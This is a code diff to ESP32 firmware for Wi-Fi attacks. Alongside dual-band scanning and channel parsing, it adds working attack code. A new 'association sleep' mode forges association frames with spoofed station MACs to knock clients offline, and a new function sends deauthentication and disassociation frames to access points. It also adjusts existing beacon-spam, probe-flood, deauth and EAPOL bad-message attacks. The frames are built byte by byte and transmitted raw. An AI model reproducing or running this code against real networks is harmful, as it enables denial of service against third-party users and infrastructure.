@@ -40,6 +40,10 @@ void WiFiModules::main() {
 	probe_req_ssids = new LinkedList<ProbeReqSsid>();
 
 	esp_wifi_init(&cfg);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+      	esp_event_loop_create_default();
+	#endif
 	esp_wifi_set_mode(WIFI_AP_STA);
 	esp_wifi_start();
 	wifi_initialized = true;
@@ -102,10 +106,10 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
 		for (int i = 0; i < 55; i++) sendBeaconRandomSSID();
 	}
-	else if (attack_mode == WIFI_ATTACK_STA_BEACON) {
+	else if (attack_mode == WIFI_ATTACK_FUN_BEACON) {
 		for (int i = 0; i < 7; i++) {
-			for (int x = 0; x < GET_SIZE(stable_ssid_beacon); x++) {
-				sendCustomESSIDBeacon(stable_ssid_beacon[x]);
+			for (int x = 0; x < GET_SIZE(funny_ssid_beacon); x++) {
+				sendCustomESSIDBeacon(funny_ssid_beacon[x]);
 			}
 		}
 	}
@@ -145,6 +149,28 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 										  access_points->get(i).channel,
 										  device_station->get(access_points->get(i).stations->get(x)).mac,
 										  access_points->get(i).wpa);
+			  	}
+			}
+		}
+	}
+	else if (attack_mode == WIFI_ATTACK_SLEEP) {
+		for (int i = 0; i < access_points->size(); i++) {
+			for (int x = 0; x < access_points->get(i).stations->size(); x++) {
+			  	if (device_station->get(access_points->get(i).stations->get(x)).selected) {
+					sendAssociationSleep(access_points->get(i).essid.c_str(), access_points->get(i).bssid,
+									 access_points->get(i).channel,
+									 device_station->get(access_points->get(i).stations->get(x)).mac);
+			 	}
+			}
+		}
+	}
+	else if (attack_mode == WIFI_ATTACK_SLEEP_ALL) {
+		for (int i = 0; i < access_points->size(); i++) {
+			if (access_points->get(i).selected) {
+			  for (int x = 0; x < access_points->get(i).stations->size(); x++) {
+				sendAssociationSleep(access_points->get(i).essid.c_str(), access_points->get(i).bssid,
+									 access_points->get(i).channel,
+									 device_station->get(access_points->get(i).stations->get(x)).mac);
 			  	}
 			}
 		}
@@ -205,7 +231,7 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 		this->StartWiFiAttack(mode);
 		Serial.println("[INFO] Starting [Random Beacon] Attack!");
 	}
-	else if (mode == WIFI_ATTACK_STA_BEACON) {
+	else if (mode == WIFI_ATTACK_FUN_BEACON) {
 		this->StartWiFiAttack(mode);
 		Serial.println("[INFO] Staring [Stable Beacon] Attack!");
 	}
@@ -225,6 +251,14 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 		this->StartWiFiAttack(mode);
 		Serial.println("[INFO] Starting [BadMsg All] Attack!");
 	}
+	else if (mode == WIFI_ATTACK_SLEEP) {
+		this->StartWiFiAttack(mode);
+		Serial.println("[INFO] Starting [Target Association Sleep] Attack!");
+	}
+	else if (mode == WIFI_ATTACK_SLEEP_ALL) {
+		this->StartWiFiAttack(mode);
+		Serial.println("[INFO] Starting [Association Sleep All] Attack!");
+	}
 }
 
 void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
@@ -232,6 +266,9 @@ void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
 	ap_config.ap.beacon_interval = 10000;
 	ap_config.ap.ssid_len = 0;
 	esp_wifi_init(&cfg);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_AP);
 	esp_wifi_set_config(WIFI_IF_AP, &ap_config);
@@ -270,17 +307,29 @@ void WiFiModules::changeChannel() {
 }
 
 void WiFiModules::channelHop() {
+	#ifndef BOARD_ESP32_C5_DEVKIT_C1
 	this->set_channel = this->set_channel + 1;
 	if (this->set_channel > 14) {
 		this->set_channel = 1;
 	}
+	#else
+	//if (dual_band_channels_index >= DUAL_BAND_CHANNELS) dual_band_channels_index = 0;
+	//else this->dual_band_channels_index++;
+	this->set_channel = this->dual_band_channels[dual_band_channels_index];
+	dual_band_channels_index = (dual_band_channels_index + 1) % DUAL_BAND_CHANNELS;
+	#endif
+	
 	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
 	Serial.printf("[INFO] Changed channel to %d using channel hop\n", this->set_channel);
 	vTaskDelay(1 / portTICK_PERIOD_MS);
 }
 
 void WiFiModules::channelRandom() {
+	#ifndef BOARD_ESP32_C5_DEVKIT_C1
 	this->set_channel = random(14) + 1;
+	#else
+	this->set_channel = this->dual_band_channels[random(DUAL_BAND_CHANNELS)];
+	#endif
 	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
 	//Serial.printf("Channel channel to %d using channel random\n", this->set_channel);
 	vTaskDelay(1 / portTICK_PERIOD_MS);
@@ -479,8 +528,35 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 					essid = bssid;
 				}
 
+				uint32_t ie_offset = 36;
+				uint8_t channel = 0;
+            
+				while (ie_offset + 2 < len) {
+					uint8_t ie_type = snifferPacket->payload[ie_offset];
+					uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
+					
+					if (ie_offset + 2 + ie_length > len) break;
+
+					if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
+						channel = snifferPacket->payload[ie_offset + 2];
+						break;
+					}
+					
+					ie_offset += 2 + ie_length;
+				}
+
+				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
+				WiFiScanBand band;
+				if (channel > 13) {
+					band = WIFI_BAND_5Ghz;
+				} else {
+					band = WIFI_BAND_2_4Ghz;
+				}
+
 				if (!low_memory_warning)
-					display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
+					//display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
+					display_buffer->add("Ch:" + String(channel) + " " + essid);
 				else
 					display_buffer->add("Low Mem! Ignore!");
 				wifiScanRedraw = true;
@@ -501,7 +577,8 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 				}
 
 				AccessPoint _temp_ap = {essid,
-					static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),{
+					//static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),
+					channel, {
 					snifferPacket->payload[10],
 					snifferPacket->payload[11],
 					snifferPacket->payload[12],
@@ -510,15 +587,15 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 					snifferPacket->payload[15]},
 					security_type, wpastr, false, new LinkedList<uint16_t>(),
 					{snifferPacket->payload[34], snifferPacket->payload[35]},
-					WIFI_BAND_2_4G,
+					band,
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				if (!low_memory_warning) {
 					access_points->add(_temp_ap);
-					Serial.println("[INFO] Added: " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
+					Serial.println("[INFO] Added: " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
 					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
 				} else {
-					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
+					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
 					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ") - Not added to list");
 				}
 
@@ -578,10 +655,37 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 					essid = bssid;
 				}
 
+				uint32_t ie_offset = 36;
+				uint8_t channel = 0;
+            
+				while (ie_offset + 2 < len) {
+					uint8_t ie_type = snifferPacket->payload[ie_offset];
+					uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
+					
+					if (ie_offset + 2 + ie_length > len) break;
+
+					if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
+						channel = snifferPacket->payload[ie_offset + 2];
+						break;
+					}
+					
+					ie_offset += 2 + ie_length;
+				}
+
+				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
+				WiFiScanBand band;
+				if (channel > 13) {
+					band = WIFI_BAND_5Ghz;
+				} else {
+					band = WIFI_BAND_2_4Ghz;
+				}
+
 				if (!low_memory_warning)
-				display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
+					//display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
+					display_buffer->add("Ch:" + String(channel) + " " + essid);
 				else
-				display_buffer->add("Low Mem! Ignore!");
+					display_buffer->add("Low Mem! Ignore!");
 				wifiScanRedraw = true;
 
 				String wpastr = "";
@@ -600,7 +704,8 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 				}
 
 				AccessPoint _temp_ap = {essid,
-					static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),{
+					//static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),
+					channel, {
 					snifferPacket->payload[10],
 					snifferPacket->payload[11],
 					snifferPacket->payload[12],
@@ -609,15 +714,15 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 					snifferPacket->payload[15]},
 					security_type, wpastr, false, new LinkedList<uint16_t>(),
 					{snifferPacket->payload[34], snifferPacket->payload[35]},
-					WIFI_BAND_2_4G,
+					band,
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				if (!low_memory_warning) {
 					access_points->add(_temp_ap);
-					Serial.println("[INFO] Added: " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
+					Serial.println("[INFO] Added: " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
 					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
 				} else {
-					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
+					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
 					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
 				}
 				
@@ -757,7 +862,7 @@ void WiFiModules::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t t
 		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
 		const WifiMgmtHdr *hdr = &ipkt->hdr;
 		static unsigned long deauthcheck = 0;
-		if (millis() - deauthcheck > 50) { // prevent crash
+		if (millis() - deauthcheck > 30) { // prevent crash
 			if (snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 )
 			{
 				char addr[] = "00:00:00:00:00:00";
@@ -798,6 +903,25 @@ void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 				probe_req_essid.concat((char)snifferPacket->payload[26 + i]);
 			}
 
+			uint32_t ie_offset = 36;
+			uint8_t channel = 0;
+            
+			while (ie_offset + 2 < len) {
+				uint8_t ie_type = snifferPacket->payload[ie_offset];
+				uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
+					
+				if (ie_offset + 2 + ie_length > len) break;
+
+				if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
+					channel = snifferPacket->payload[ie_offset + 2];
+					break;
+				}
+					
+				ie_offset += 2 + ie_length;
+			}
+
+			if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
 			if (probe_req_essid.length() > 0) {
 				bool essidExist = false;
 				for (int i = 0; i < probe_req_ssids->size(); i++) {
@@ -814,7 +938,7 @@ void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 					probeReqSsid.essid = probe_req_essid;
 				  	probeReqSsid.requests = 1;
 					probeReqSsid.selected = false;
-					probeReqSsid.channel = snifferPacket->rx_ctrl.channel;
+					probeReqSsid.channel = /*snifferPacket->rx_ctrl.channel;*/ channel;
 					probeReqSsid.rssi = snifferPacket->rx_ctrl.rssi;
 					if (!low_memory_warning) {
 				  		probe_req_ssids->add(probeReqSsid);
@@ -827,7 +951,7 @@ void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 				display_buffer->add("->" + probe_req_essid);
 			} else display_buffer->add("Low Mem! Ignore!");
 			wifiScanRedraw = true;
-			Serial.println("[INFO] Probe Detected! Client:" + String(addr) + " Requesting: (CH:" + String(snifferPacket->rx_ctrl.channel) \
+			Serial.println("[INFO] Probe Detected! Client:" + String(addr) + " Requesting: (CH:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) \
 			+ ") " + probe_req_essid + " RSSI: " + String(snifferPacket->rx_ctrl.rssi));
 
 			logutils.pcapAppend(snifferPacket, len);
@@ -865,8 +989,27 @@ void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t 
 				display_buffer->add("Pwn bc dectected!");
 				return;
 			}
+			uint32_t ie_offset = 36;
+			uint8_t channel = 0;
+            
+			while (ie_offset + 2 < len) {
+				uint8_t ie_type = snifferPacket->payload[ie_offset];
+				uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
+					
+				if (ie_offset + 2 + ie_length > len) break;
+
+				if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
+					channel = snifferPacket->payload[ie_offset + 2];
+					break;
+				}
+					
+				ie_offset += 2 + ie_length;
+			}
+
+			if (channel == 0) channel = snifferPacket->rx_ctrl.channel;
+
 			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
-			add_to_buffer.concat("C:" + String(snifferPacket->rx_ctrl.channel));
+			add_to_buffer.concat("C:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel));
 			add_to_buffer.concat(" ");
 			char addr[] = "00:00:00:00:00:00";
 			getMAC(addr, snifferPacket->payload, 10);
@@ -882,10 +1025,10 @@ void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t 
 			display_buffer->add(add_to_buffer);
 			wifiScanRedraw = true;
 			if (essid == String(addr))
-				Serial.println("[INFO] Beacon Detected! <Hidden ESSID> (Ch:" + String(snifferPacket->rx_ctrl.channel) + ") " \
+				Serial.println("[INFO] Beacon Detected! <Hidden ESSID> (Ch:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ") " \
 				+ "(BSSID:" + String(addr) + ") " + "(RSSI:" + String(snifferPacket->rx_ctrl.rssi) + ")");
 			else
-				 Serial.println("[INFO] Beacon Detected! " + essid + " (Ch:" + String(snifferPacket->rx_ctrl.channel) + ") " \
+				 Serial.println("[INFO] Beacon Detected! " + essid + " (Ch:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ") " \
 				+ "(BSSID:" + String(addr) + ") " + "(RSSI:" + String(snifferPacket->rx_ctrl.rssi) + ")");
 
 			logutils.pcapAppend(snifferPacket, len);
@@ -930,7 +1073,7 @@ void WiFiModules::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 		}
 	}
 
-	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
+	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e) || ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
 
 		char addr[] = "00:00:00:00:00:00";
 		getMAC(addr, snifferPacket->payload, 10);
@@ -985,6 +1128,10 @@ void WiFiModules::StartAnalyzerScan() {
 	Serial.println("[INFO] Starting Analyzer scan...");
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1003,6 +1150,10 @@ void WiFiModules::StartBeaconScan() {
 	logutils.createFile("beacon", true);
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1024,6 +1175,10 @@ void WiFiModules::StartProbeReqScan() {
 	logutils.createFile("probe", true);
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1043,6 +1198,10 @@ void WiFiModules::StartDeauthScan() {
 	logutils.createFile("deauth", true);
 
 	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1062,6 +1221,10 @@ void WiFiModules::StartEapolScan() {
 	logutils.createFile("eapol", true);
 
 	esp_wifi_init(&cfg);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_AP);
 
@@ -1135,6 +1298,10 @@ void WiFiModules::StartAPWiFiScan() {
   	esp_event_loop_create_default();
 
   	esp_wifi_init(&cfg2);
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+	 	esp_wifi_set_country(&country);
+    	esp_event_loop_create_default();
+	#endif
 	esp_wifi_set_storage(WIFI_STORAGE_RAM);
 	esp_wifi_set_mode(WIFI_MODE_NULL);
 	esp_wifi_start();
@@ -1229,12 +1396,10 @@ void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
 	vTaskDelay(1 / portTICK_PERIOD_MS);  
 
 	// Randomize SRC MAC
-	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
-	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
-	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
-	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
-	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
-	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);
+	for (int i = 0; i < 6; i++) {
+		beacon_frame_packet[10 + i] = random(256);
+		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
+	}
 
 	char ESSID[custom_ssid.essid.length() + 1] = {};
 	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
@@ -1285,12 +1450,10 @@ void WiFiModules::sendCustomESSIDBeacon(const char* ESSID) {
 	channelRandom();
 
 	// Randomize SRC MAC
-	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
-	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
-	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
-	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
-	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
-	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);
+	for (int i = 0; i < 6; i++) {
+		beacon_frame_packet[10 + i] = random(256);
+		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
+	}
 
 	int ssidLen = strlen(ESSID);
 	beacon_frame_packet[37] = ssidLen;
@@ -1336,12 +1499,10 @@ void WiFiModules::sendBeaconRandomSSID() {
 	channelRandom();  
 
 	// Randomize SRC MAC
-	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
-	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
-	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
-	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
-	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
-	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);
+	for (int i = 0; i < 6; i++) {
+		beacon_frame_packet[10 + i] = random(256);
+		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
+	}
 
 	beacon_frame_packet[37] = 6;
 	
@@ -1417,6 +1578,28 @@ void WiFiModules::sendDeauthAttack() {
 				packet_sent -= 1;
 		}
 	}
+}
+
+void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel) {
+	this->set_channel = channel;
+	changeChannel();
+	delay(1);
+	
+	// Build packet
+	memcpy(&deauth_frame_packet[10], bssid, 6);
+	memcpy(&deauth_frame_packet[16], bssid, 6);
+
+	memcpy(&disassoc_frame_packet[10], bssid, 6);
+	memcpy(&disassoc_frame_packet[16], bssid, 6);     
+  
+	// Send packet
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+
+	esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
 }
 
 void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
@@ -1502,12 +1685,9 @@ void WiFiModules::sendProbeAttack() {
       
 			// Build packet
 			// Randomize SRC MAC
-			probe_frame_packet[10] = random(256);
-			probe_frame_packet[11] = random(256);
-			probe_frame_packet[12] = random(256);
-			probe_frame_packet[13] = random(256);
-			probe_frame_packet[14] = random(256);
-			probe_frame_packet[15] = random(256);
+			for (int i = 0; i < 6; i++) {
+				probe_frame_packet[10 + i] = random(256);
+			}
 
 			// Set SSID length
 			int ssidLen = access_points->get(i).essid.length();
@@ -1555,7 +1735,6 @@ void WiFiModules::sendProbeAttack() {
 void WiFiModules::sendEapolBagMsg(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
 	this->set_channel = channel;
 	changeChannel();
-	vTaskDelay(1 / portTICK_PERIOD_MS);
   
 	// Build packet
 	memcpy(&eapol_packet_bad_msg1[4], mac, 6);
@@ -1596,4 +1775,115 @@ void WiFiModules::sendEapolBagMsg(uint8_t bssid[6], int channel, uint8_t mac[6],
 		packet_sent -= 1;
 	if (res_3 != ESP_OK)
 		packet_sent -= 1;
-  }
+}
+
+void WiFiModules::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
+	// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp#L6646
+	this->set_channel = channel;
+	changeChannel();
+
+	// Build packet
+	static uint16_t sequence_number = 0;
+
+	memcpy(&association_packet[4], bssid, 6);
+	memcpy(&association_packet[10], sta_mac, 6);
+	memcpy(&association_packet[16], bssid, 6);
+
+	/* Set Sequence Control */
+	association_packet[23] = (sequence_number >> 8) & 0xFF; // Sequence Number MSB
+	association_packet[22] = sequence_number & 0xFF;        // Sequence Number LSB
+  
+	/* SSID tag */
+	association_packet[29] = (uint8_t)strlen((char *)ESSID); // SSID Length
+	memcpy(&association_packet[30], ESSID, strlen((char *)ESSID)); // SSID
+  
+	/* Supported Rates tag */
+	uint16_t offset = 30 + strlen((char *)ESSID); // Offset after SSID);
+	association_packet[offset++] = 0x01; // Supported Rates tag
+	association_packet[offset++] = 0x04; // Length
+	association_packet[offset++] = 0x82;  // 1 Mbps
+	association_packet[offset++] = 0x04;  // 2 Mbps
+	association_packet[offset++] = 0x0b;  // 5.5 Mbps
+	association_packet[offset++] = 0x16;  // 11 Mbps
+  
+	/* Power Capability tag */
+	association_packet[offset++] = 0x21; // Power Capability tag
+	association_packet[offset++] = 0x02; // Length
+	association_packet[offset++] = 0x01; // Min Tx Power
+	association_packet[offset++] = 0x15; // Max Tx Power
+  
+	/* Supported Channels tag */
+	association_packet[offset++] = 0x24; // Supported Channels tag
+	association_packet[offset++] = 0x02; // Length
+	association_packet[offset++] = 0x01; // First Channel
+	association_packet[offset++] = 0x0d; // Last Channel
+  
+	/* RSN tag */
+	association_packet[offset++] = 0x30; // RSN tag
+	association_packet[offset++] = 0x14; // Length
+	association_packet[offset++] = 0x01; // Version MSB
+	association_packet[offset++] = 0x00; // Version LSB
+	association_packet[offset++] = 0x00; // Group Cipher Suite OUI MSB
+	association_packet[offset++] = 0x0F; // Group Cipher Suite OUI LSB
+	association_packet[offset++] = 0xAC; // Group Cipher Suite OUI LSB
+	association_packet[offset++] = 0x04; // Group Cipher Suite Type (AES-CCMP)
+	association_packet[offset++] = 0x01; // Pairwise Cipher Suite Count
+	association_packet[offset++] = 0x00; // Pairwise Cipher Suite Count MSB
+	association_packet[offset++] = 0x00; // Pairwise Cipher Suite OUI MSB
+	association_packet[offset++] = 0x0F; // Pairwise Cipher Suite OUI LSB
+	association_packet[offset++] = 0xAC; // Pairwise Cipher Suite OUI LSB
+	association_packet[offset++] = 0x04; // Pairwise Cipher Suite Type (AES-CCMP)
+	association_packet[offset++] = 0x01; // AKM Suite Count
+	association_packet[offset++] = 0x00; // AKM Suite Count MSB
+	association_packet[offset++] = 0x00; // AKM Suite OUI MSB
+	association_packet[offset++] = 0x0f; // AKM Suite OUI MSB
+	association_packet[offset++] = 0xAC; // AKM Suite OUI LSB
+	association_packet[offset++] = 0x02; // AKM Suite OUI LSB (WPA2-PSK)
+	association_packet[offset++] = 0x0c; // RSN Capabilities MSB
+	association_packet[offset++] = 0x00; // RSN Capabilities LSB
+  
+	/* Supported Operating Classes tag */
+	association_packet[offset++] = 0x3b; // Supported Operating Classes tag
+	association_packet[offset++] = 0x14; // Length
+	association_packet[offset++] = 0x51; // Current Operating Class 1 (2.4 GHz)
+	/* alternate Operating Class */
+	association_packet[offset++] = 0x86; // Operating Class 2 (5 GHz)
+	association_packet[offset++] = 0x85; // Operating Class 3 (6 GHz)
+	association_packet[offset++] = 0x84; // Operating Class 4 (60 GHz)
+	association_packet[offset++] = 0x83; // Operating Class 5 (60 GHz)
+	association_packet[offset++] = 0x81; // Operating Class 6 (60 GHz)
+	association_packet[offset++] = 0x7f; // Operating Class 7 (60 GHz)
+	association_packet[offset++] = 0x7e; // Operating Class 8 (60 GHz)
+	association_packet[offset++] = 0x7d; // Operating Class 9 (60 GHz)
+	association_packet[offset++] = 0x7c; // Operating Class 10 (60 GHz)
+	association_packet[offset++] = 0x7b; // Operating Class 11 (60 GHz)
+	association_packet[offset++] = 0x7a; // Operating Class 12 (60 GHz)
+	association_packet[offset++] = 0x79; // Operating Class 13 (60 GHz)
+	association_packet[offset++] = 0x78; // Operating Class 14 (60 GHz)
+	association_packet[offset++] = 0x77; // Operating Class 15 (60 GHz)
+	association_packet[offset++] = 0x76; // Operating Class 16 (60 GHz)
+	association_packet[offset++] = 0x75; // Operating Class 17 (60 GHz)
+	association_packet[offset++] = 0x74; // Operating Class 18 (60 GHz)
+	association_packet[offset++] = 0x73; // Operating Class 19 (60 GHz)
+	association_packet[offset++] = 0x51; // Operating Class 20 (2.4 GHz)
+  
+	/* Vendor Specific tag */
+	association_packet[offset++] = 0xdd; // Vendor Specific tag
+	association_packet[offset++] = 0x0a; // Length
+	association_packet[offset++] = 0x00;
+	association_packet[offset++] = 0x10;
+	association_packet[offset++] = 0x18;
+	association_packet[offset++] = 0x02;
+	association_packet[offset++] = 0x00;
+	association_packet[offset++] = 0x00;
+	association_packet[offset++] = 0x10;
+	association_packet[offset++] = 0x00;
+	association_packet[offset++] = 0x00;
+	association_packet[offset++] = 0x02;
+  
+	// Send packet
+	esp_wifi_80211_tx(WIFI_IF_AP, association_packet, offset, false);
+  
+	packet_sent += 1;
+
+}
